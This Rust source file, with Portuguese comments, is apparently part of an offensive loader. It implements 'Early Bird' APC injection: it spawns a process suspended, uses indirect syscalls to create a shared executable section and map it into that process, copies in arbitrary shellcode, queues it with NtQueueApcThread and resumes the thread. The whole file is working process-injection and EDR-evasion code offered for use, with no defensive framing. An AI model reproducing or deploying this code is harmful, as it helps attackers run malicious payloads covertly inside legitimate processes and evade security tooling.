use std::ffi::{c_void, OsStr};
use std::os::windows::ffi::OsStrExt;
use std::ptr::null_mut;
use winapi::shared::ntdef::{HANDLE, LARGE_INTEGER};
use winapi::um::processthreadsapi::{CreateProcessW, GetCurrentProcess, PROCESS_INFORMATION, STARTUPINFOW};
use winapi::um::winbase::CREATE_SUSPENDED;
use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READWRITE, SECTION_ALL_ACCESS, SEC_COMMIT};
use crate::indirect_syscalls::{NtCreateSection, NtMapViewOfSection, NtQueueApcThread, NtResumeThread};

pub fn fly(shellcode: &[u8], target_proc: &str) -> bool {
    // 1. Cria processo suspenso
    let (pi, _si) = match spawn_suspended_process(target_proc) {
        Ok(val) => val,
        Err(_) => {
            eprintln!("[!] Falha ao criar processo suspenso.");
            return false;
        }
    };

    let size = shellcode.len();

    // 2. Cria seção compartilhada
    let mut section_handle: HANDLE = null_mut();
    let mut max_size = make_large_integer(size as i64);

    let status = unsafe {
        NtCreateSection(
            &mut section_handle,
            SECTION_ALL_ACCESS,
            null_mut(),
            &mut max_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            null_mut(),
        )
    };

    if status < 0 {
        eprintln!("[-] NtCreateSection falhou: {:#X}", status);
        return false;
    }

    // 3. Mapeia local com RW
    let mut local_section_address: *mut c_void = null_mut();
    let mut view_size = size;

    let status = unsafe {
        NtMapViewOfSection(
            section_handle,
            GetCurrentProcess(),
            &mut local_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2, // ViewUnmap
            0,
            PAGE_READWRITE,
        )
    };

    if status < 0 {
        eprintln!("[-] NtMapViewOfSection (local) falhou: {:#X}", status);
        return false;
    }

    // 4. Mapeia remoto com RX
    let mut remote_section_address: *mut c_void = null_mut();

    let status = unsafe {
        NtMapViewOfSection(
            section_handle,
            pi.hProcess,
            &mut remote_section_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2, // ViewUnmap
            0,
            PAGE_EXECUTE_READ,
        )
    };

    if status < 0 {
        eprintln!("[-] NtMapViewOfSection (remoto) falhou: {:#X}", status);
        return false;
    }

    // 5. Copia o shellcode para a view local
    unsafe {
        std::ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            local_section_address as *mut u8,
            shellcode.len(),
        );
    }

    // 6. Agendar com NtQueueApcThread
    let status = unsafe {
        NtQueueApcThread(
            pi.hThread,
            remote_section_address as *mut c_void,
            null_mut(),
            null_mut(),
            null_mut(),
        )
    };

    if status != 0 {
        eprintln!("[-] NtQueueApcThread falhou (status: 0x{:x})", status);
        return false;
    }

    // 7. Resume a thread
    let resume_status = unsafe {
        NtResumeThread(
            pi.hThread,
            null_mut(),
        )
    };

    if resume_status < 0 {
        eprintln!("[-] NtResumeThread falhou (status: {})", resume_status);
        return false;
    }

    println!("[+] Early Bird injection finalizado com sucesso!");
    true
}



pub fn spawn_suspended_process(path: &str) -> Result<(PROCESS_INFORMATION, STARTUPINFOW), ()> {
    let mut command: Vec<u16> = OsStr::new(path).encode_wide().collect();
    command.push(0); // null terminator

    let mut si: STARTUPINFOW = unsafe { std::mem::zeroed() };
    si.cb = std::mem::size_of::<STARTUPINFOW>() as u32;

    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let result = unsafe {
        CreateProcessW(
            std::ptr::null_mut(),         // lpApplicationName
            command.as_mut_ptr(),         // lpCommandLine
            std::ptr::null_mut(),         // lpProcessAttributes
            std::ptr::null_mut(),         // lpThreadAttributes
            0,                            // bInheritHandles
            CREATE_SUSPENDED,             // dwCreationFlags
            std::ptr::null_mut(),         // lpEnvironment
            std::ptr::null_mut(),         // lpCurrentDirectory
            &mut si as *mut STARTUPINFOW, // lpStartupInfo
            &mut pi as *mut PROCESS_INFORMATION, // lpProcessInformation
        )
    };

    if result == 0 {
        eprintln!("[!] Erro ao criar processo suspenso.");
        return Err(());
    }

    Ok((pi, si))
}


pub fn allocate_and_map_section(h_process: HANDLE, size: usize) -> Option<*mut c_void> {

    let mut max_size = make_large_integer(size as i64);


    let mut section_handle: HANDLE = 0 as HANDLE;

    let status = unsafe {
        NtCreateSection(
            &mut section_handle,
            0xF001F, // SECTION_ALL_ACCESS
            null_mut(),
            &mut max_size,
            PAGE_EXECUTE_READWRITE,
            SEC_COMMIT,
            0 as HANDLE,
        )
    };

    if status != 0 {
        eprintln!("[!] NtCreateSection falhou (status: 0x{:x})", status);
        return None;
    }

    let mut base_address: *mut c_void = null_mut();
    let mut view_size = size;

    let status = unsafe {
        NtMapViewOfSection(
            section_handle,
            h_process,
            &mut base_address,
            0,
            0,
            null_mut(),
            &mut view_size,
            2, // ViewUnmap
            0,
            PAGE_EXECUTE_READWRITE,
        )


    };



    if status != 0 {
        eprintln!("[!] NtMapViewOfSection falhou (status: 0x{:x})", status);
        return None;
    }

    Some(base_address)
}

pub fn make_large_integer(value: i64) -> LARGE_INTEGER {
    let mut li: LARGE_INTEGER = unsafe { std::mem::zeroed() };
    unsafe {
        *li.QuadPart_mut() = value;
    }
    li
}